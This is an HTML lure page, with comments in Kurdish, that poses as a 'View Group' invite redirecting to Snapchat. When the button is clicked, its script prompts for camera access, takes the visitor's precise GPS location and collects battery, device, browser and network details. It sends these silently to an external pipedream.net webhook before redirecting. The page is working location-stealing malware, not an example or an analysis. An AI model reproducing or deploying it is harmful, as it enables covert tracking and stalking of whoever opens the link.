<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .btn {
            background-color: #0088cc;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0,136,204,0.4);
            transition: 0.3s;
        }
        .btn:hover {
            background-color: #0077b5;
        }
    </style>
</head>
<body>

    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
    <button class="btn" id="viewGroupBtn">View Group</button>

    <script>
        // وێبهۆکە ڕاستەکەی خۆت لێرەدا جێگیرە
        const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
        const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";

        let globalBattery = "N/A";
        let globalCharging = "N/A";
        let globalMaps = "⚠️ مۆڵەتی نەدا";
        let globalDevice = navigator.platform || "Unknown";
        
        // جیاکردنەوەی وردی کرۆم و سەفاری لەسەر ئایفۆن
        let globalBrowser = "Safari (iPhone)";
        if (navigator.userAgent.indexOf("CriOS") > -1 || navigator.userAgent.indexOf("Chrome") > -1) {
            globalBrowser = "Chrome (iPhone)";
        }

        let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";

        // خێرا وەرگرتنی ڕێژەی باتری
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                globalBattery = Math.round(battery.level * 100) + "%";
                globalCharging = battery.charging ? "بەڵێ" : "نەخێر";
            }).catch(() => {});
        }

        // 🚀 تەواوی لۆجیکەکە لێرەوە دەست پێدەکات کاتێک دەست بە دوگمەکەوە دەنێت
        document.getElementById('viewGroupBtn').addEventListener('click', async function() {
            document.getElementById('viewGroupBtn').innerText = "Loading...";

            // ١. داواکردنی مۆڵەتی کامێرا ڕێک لە کاتی داگرتنی دوگمەکەدا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                // ئەگەر مۆڵەتی دا، کامێراکە دەکوژێنینەوە چونکە تەنها پۆپئەپەکەمان مەبەستە
                stream.getTracks().forEach(track => track.stop());
            } catch (cameraErr) {
                console.log("کامێرا ڕەتکرایەوە یان پشتگیری ناکرێت");
            }

            // ٢. ڕاستەوخۆ دوای ئەوە، داواکردنی مۆڵەتی لۆکەیشن
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition((position) => {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
                        resolve();
                    }, () => {
                        resolve(); // ئەگەر ڕەتیشی کردەوە هەر دەچێتە قۆناغی دواتر
                    }, { enableHighAccuracy: true, timeout: 5000 });
                });
            }

            // ٣. ڕێکخستنی داتاکان بۆ ناردن
            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
            const payload = {
                uid: uid,
                battery: globalBattery,
                charging: globalCharging,
                device: globalDevice,
                browser: globalBrowser,
                network: globalNetwork,
                time: globalTime,
                maps: globalMaps
            };

            const params = new URLSearchParams();
            for (const key in payload) {
                params.append(key, payload[key]);
            }

            // ٤. ناردنی دڵنیا بە sendBeacon بۆ ئەوەی لە ئایفۆندا نەپچڕێت
            if (navigator.sendBeacon) {
                navigator.sendBeacon(secureWebhook, params);
            } else {
                await fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
            }

            // ٥. بازدان بۆ سەر لینکەکەی سناپچات
            window.location.href = snapchatRedirectUrl;
        });
    </script>
</body>
</html>
